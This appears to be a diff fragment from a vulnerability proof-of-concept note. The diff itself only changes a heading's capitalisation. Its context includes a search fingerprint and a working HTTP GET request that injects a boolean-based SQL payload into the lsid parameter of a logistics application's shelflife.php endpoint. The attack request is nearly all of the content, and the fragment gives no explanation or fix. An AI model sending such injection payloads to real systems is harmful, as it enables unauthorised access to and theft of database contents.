@@ -8,7 +8,7 @@
 body="tmp_md5_pwd"
 ```
 
-## poc
+## POC
 
 ```java
 GET /logistics/home_warning/php/shelflife.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6191=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END)) HTTP/1.1
